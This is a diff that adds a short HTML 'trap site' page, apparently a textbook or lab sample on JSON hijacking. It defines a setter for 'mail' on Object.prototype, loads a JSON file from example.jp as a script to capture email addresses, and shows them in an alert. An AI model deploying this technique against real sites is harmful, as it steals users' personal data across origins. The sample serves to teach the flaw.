@@ -1,0 +1,10 @@
+<body onload="alert(x)">
+罠サイト
+<script>
+var x = "";
+Object.prototype.__defineSetter__("mail", function(v) {
+  x += v + " ";
+});
+</script>
+<script src="http://example.jp/4g/4g-030.json"></script>
+</body>
